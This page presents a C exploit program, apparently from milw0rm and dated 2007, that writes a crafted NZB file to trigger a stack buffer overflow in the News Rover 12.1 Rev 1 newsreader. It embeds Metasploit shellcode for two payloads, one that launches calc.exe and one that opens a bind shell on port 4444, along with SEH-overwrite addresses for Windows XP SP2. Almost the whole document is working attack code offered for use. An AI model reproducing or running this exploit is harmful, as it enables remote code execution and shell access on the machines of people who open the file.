<html><head><title>News Rover 12.1 Rev 1 Remote Stack Overflow Exploit</title></head><pre>/*********************************************************************************************\
*                                                                                             *
*                    News Rover 12.1 Rev 1 Remote Stack Overflow exploit                      *
*                 Coded and discovered by Marsu &lt;MarsupilamiPowa@hotmail.fr&gt;                  *
*                                                                                             *
*             Note: thx aux Bananas et a la KryptonIT. Bon courage aux inuITs :P              *
\*********************************************************************************************/

#include &quot;stdlib.h&quot;
#include &quot;stdio.h&quot;
#include &quot;string.h&quot;


/* win32_exec -  EXITFUNC=seh CMD=calc.exe Size=164 Encoder=PexFnstenvSub http://metasploit.com */
/* BAD CHARS ARE 0x00 0x3c 0x3d 0x3e 0x3f 0x0a 0x0d 0x22 0x25 0x26 0xA7 0x8a. Maybe more... */
char calcshellcode[] =
&quot;\x2b\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xa4&quot;
&quot;\xb2\x82\x70\x83\xeb\xfc\xe2\xf4\x58\x5a\xc6\x70\xa4\xb2\x09\x35&quot;
&quot;\x98\x39\xfe\x75\xdc\xb3\x6d\xfb\xeb\xaa\x09\x2f\x84\xb3\x69\x39&quot;
&quot;\x2f\x86\x09\x71\x4a\x83\x42\xe9\x08\x36\x42\x04\xa3\x73\x48\x7d&quot;
&quot;\xa5\x70\x69\x84\x9f\xe6\xa6\x74\xd1\x57\x09\x2f\x80\xb3\x69\x16&quot;
&quot;\x2f\xbe\xc9\xfb\xfb\xae\x83\x9b\x2f\xae\x09\x71\x4f\x3b\xde\x54&quot;
&quot;\xa0\x71\xb3\xb0\xc0\x39\xc2\x40\x21\x72\xfa\x7c\x2f\xf2\x8e\xfb&quot;
&quot;\xd4\xae\x2f\xfb\xcc\xba\x69\x79\x2f\x32\x32\x70\xa4\xb2\x09\x18&quot;
&quot;\x98\xed\xb3\x86\xc4\xe4\x0b\x88\x27\x72\xf9\x20\xcc\x42\x08\x74&quot;
&quot;\xfb\xda\x1a\x8e\x2e\xbc\xd5\x8f\x43\xd1\xe3\x1c\xc7\x9c\xe7\x08&quot;
&quot;\xc1\xb2\x82\x70&quot;;
 
/* win32_bind -  EXITFUNC=seh LPORT=4444 Size=344 Encoder=PexFnstenvSub http://metasploit.com */
char bindshellcode[] =
&quot;\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xf7&quot;
&quot;\x82\xf8\x80\x83\xeb\xfc\xe2\xf4\x0b\xe8\x13\xcd\x1f\x7b\x07\x7f&quot;
&quot;\x08\xe2\x73\xec\xd3\xa6\x73\xc5\xcb\x09\x84\x85\x8f\x83\x17\x0b&quot;
&quot;\xb8\x9a\x73\xdf\xd7\x83\x13\xc9\x7c\xb6\x73\x81\x19\xb3\x38\x19&quot;
&quot;\x5b\x06\x38\xf4\xf0\x43\x32\x8d\xf6\x40\x13\x74\xcc\xd6\xdc\xa8&quot;
&quot;\x82\x67\x73\xdf\xd3\x83\x13\xe6\x7c\x8e\xb3\x0b\xa8\x9e\xf9\x6b&quot;
&quot;\xf4\xae\x73\x09\x9b\xa6\xe4\xe1\x34\xb3\x23\xe4\x7c\xc1\xc8\x0b&quot;
&quot;\xb7\x8e\x73\xf0\xeb\x2f\x73\xc0\xff\xdc\x90\x0e\xb9\x8c\x14\xd0&quot;
&quot;\x08\x54\x9e\xd3\x91\xea\xcb\xb2\x9f\xf5\x8b\xb2\xa8\xd6\x07\x50&quot;
&quot;\x9f\x49\x15\x7c\xcc\xd2\x07\x56\xa8\x0b\x1d\xe6\x76\x6f\xf0\x82&quot;
&quot;\xa2\xe8\xfa\x7f\x27\xea\x21\x89\x02\x2f\xaf\x7f\x21\xd1\xab\xd3&quot;
&quot;\xa4\xd1\xbb\xd3\xb4\xd1\x07\x50\x91\xea\xe9\xdc\x91\xd1\x71\x61&quot;
&quot;\x62\xea\x5c\x9a\x87\x45\xaf\x7f\x21\xe8\xe8\xd1\xa2\x7d\x28\xe8&quot;
&quot;\x53\x2f\xd6\x69\xa0\x7d\x2e\xd3\xa2\x7d\x28\xe8\x12\xcb\x7e\xc9&quot;
&quot;\xa0\x7d\x2e\xd0\xa3\xd6\xad\x7f\x27\x11\x90\x67\x8e\x44\x81\xd7&quot;
&quot;\x08\x54\xad\x7f\x27\xe4\x92\xe4\x91\xea\x9b\xed\x7e\x67\x92\xd0&quot;
&quot;\xae\xab\x34\x09\x10\xe8\xbc\x09\x15\xb3\x38\x73\x5d\x7c\xba\xad&quot;
&quot;\x09\xc0\xd4\x13\x7a\xf8\xc0\x2b\x5c\x29\x90\xf2\x09\x31\xee\x7f&quot;
&quot;\x82\xc6\x07\x56\xac\xd5\xaa\xd1\xa6\xd3\x92\x81\xa6\xd3\xad\xd1&quot;
&quot;\x08\x52\x90\x2d\x2e\x87\x36\xd3\x08\x54\x92\x7f\x08\xb5\x07\x50&quot;
&quot;\x7c\xd5\x04\x03\x33\xe6\x07\x56\xa5\x7d\x28\xe8\x07\x08\xfc\xdf&quot;
&quot;\xa4\x7d\x2e\x7f\x27\x82\xf8\x80&quot;;




char nzbheader[]=&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;iso-8859-1\&quot; ?&gt;\n&quot;
				 &quot;&lt;!DOCTYPE nzb PUBLIC \&quot;-//newzBin//DTD NZB 1.0//EN\&quot; \&quot;http://www.newzbin.com/DTD/nzb/nzb-1.0.dtd\&quot;&gt;\n&quot;
				 &quot;&lt;!-- NZB Generated by MarsupilamiPowa --&gt;\n&quot;
				 &quot;&lt;nzb xmlns=\&quot;http://www.google.com\&quot;&gt;\n\n&quot;;


char nzbend[]=&quot;&lt;/segment&gt;\n&quot;
&quot;&lt;/segments&gt;\n&quot;
&quot;&lt;/file&gt;\n&quot;
&quot;&lt;/nzb&gt;\n&quot;;

char defaultfilename[]=&quot;file.nzb&quot;;

int main(int argc, char* argv[]) {

FILE *file;
char * pad;
int type=0;
int mode=0;
char *filename;
char *myshell;

printf(&quot;[+] NZB exploit for News Rover\n&quot;);
printf(&quot;[+] Coded and discovered by Marsu &lt;Marsupilamipowa@hotmail.fr&gt;\n&quot;);
if (argc&gt;3)	{
	type=atoi(argv[1]);
	filename=argv[3];
	mode=atoi(argv[2]);
	if (!mode)
		myshell=calcshellcode;
	else
		myshell=bindshellcode;
}
else {
	printf(&quot;[+] Usage: %s type mode file.nzb\n\n&quot;,argv[0]);
	printf(&quot;[+] type is ...\n&quot;);
	printf(&quot;0: News Rover v12.1,  Rev. 1 Subject stack overflow. Works on XP SP2 FR\n&quot;);
	printf(&quot;1: News Rover v12.1,  Rev. 1 Group stack overflow. Works on XP SP2 FR\n\n&quot;);
	printf(&quot;[+] mode is \n&quot;);
	printf(&quot;0: Spawns calc.exe\n&quot;);
	printf(&quot;1: Binds to 4444\n\n&quot;);
	printf(&quot;[+] Ex: %s 0 0 file.nzb&quot;,argv[0]);

	return 0;
}

file=fopen(filename,&quot;wb&quot;);

if (type==0)
{
	fprintf(file,nzbheader);
	fprintf(file,&quot;&lt;file poster=\&quot;Poster\&quot; date=\&quot;1170609233\&quot;\nsubject=\&quot;&quot;);
	pad = (char*)malloc(sizeof(char)*3000+strlen(myshell));
	memset(pad,'A',3000);
	memcpy(pad+2022,&quot;\xeb\x15\x90\x90&quot;,4);  //jmp short +15
	memcpy(pad+2026,&quot;\x2a\x02\xfc\x7f&quot;,4);  //pop pop ret in ??? defeats SP2 SEH call protection. Have a look to your memory and change this address if it doesnt work.
	memset(pad+2030,0x90,15);				//nop padding
	memcpy(pad+2045,myshell,strlen(myshell));
	memset(pad+2045+strlen(myshell),0,1);
	memset(pad+3000,0,1);
	fprintf(file,pad);
	fprintf(file,&quot;\&quot;&gt;\n&lt;groups&gt;&lt;group&gt;some group&lt;/group&gt;&lt;/groups&gt;\n&lt;segments&gt;\n&lt;segment bytes=\&quot;30\&quot; number=\&quot;1\&quot;&gt;some name&quot;);
	fprintf(file,nzbend);
	fclose(file);
}
else if (type==1)
{
	fprintf(file,nzbheader);
	fprintf(file,&quot;&lt;file poster=\&quot;Poster\&quot; date=\&quot;1170609233\&quot; subject=\&quot;Some Subj\&quot;&gt;\n&quot;);
	fprintf(file,&quot;&lt;groups&gt;&lt;group&gt;alt.bdffs&lt;/group&gt;&lt;/groups&gt;\n&lt;segments&gt;\n&lt;segment bytes=\&quot;30\&quot; number=\&quot;1\&quot;&gt;no matter the name&lt;/segment&gt;\n&lt;/segments&gt;\n&lt;/file&gt;&quot;);
	fprintf(file,&quot;\n\n&lt;file poster=\&quot;Poster\&quot; date=\&quot;1170609233\&quot; subject=\&quot;Some Subj\&quot;&gt;\n&quot;);
	fprintf(file,&quot;&lt;groups&gt;&lt;group&gt;&quot;);
	
	pad = (char*)malloc(sizeof(char)*100);
	memset(pad,'A',100);
	memcpy(pad,&quot;\x90\xb8\x33\x33\x33\x33\x2D\x13\x27\x33\x33\x8B\x04\x04\x40\xFF\xD0&quot;,17); //We will use data stuck in Segment to exec our code because we dont have much place here
	memcpy(pad+94,&quot;\x53\xF1\xD1\x77\00&quot;,5); //call ebx in USER32.dll
	fprintf(file,pad);
	fprintf(file,&quot;&lt;/group&gt;&lt;/groups&gt;\n&lt;segments&gt;\n&lt;segment bytes=\&quot;30\&quot; number=\&quot;1\&quot;&gt;&quot;);
	pad=(char *)realloc(pad,sizeof(char)*3000);
	memset(pad,'A',3000);
	memcpy(pad+1500,myshell,strlen(myshell));
	memset(pad+3000,0,1);
	fprintf(file,pad);
	fprintf(file,nzbend);
	fclose(file);
}


printf(&quot;[+] File generated! Have fun\n&quot;);
return 0;
}

// milw0rm.com [2007-02-20]</pre></html>